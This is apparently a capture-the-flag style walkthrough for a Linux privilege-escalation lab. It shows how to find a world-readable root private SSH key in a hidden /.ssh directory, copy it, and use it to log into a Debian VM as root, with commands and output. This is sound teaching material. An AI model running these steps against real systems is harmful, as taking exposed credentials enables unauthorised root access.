Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:
```
ls -la /
```
Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
```
ls -l /.ssh
```
```
user@debian:~$ ls -l /.ssh
total 4
-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key
```
Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
```
chmod 600 root_key
```

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):
```
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.34.1
```
```
root@ip-10-10-91-58:~# chmod 600 root_key 
root@ip-10-10-91-58:~# ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.34.1
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
root@debian:~# 
```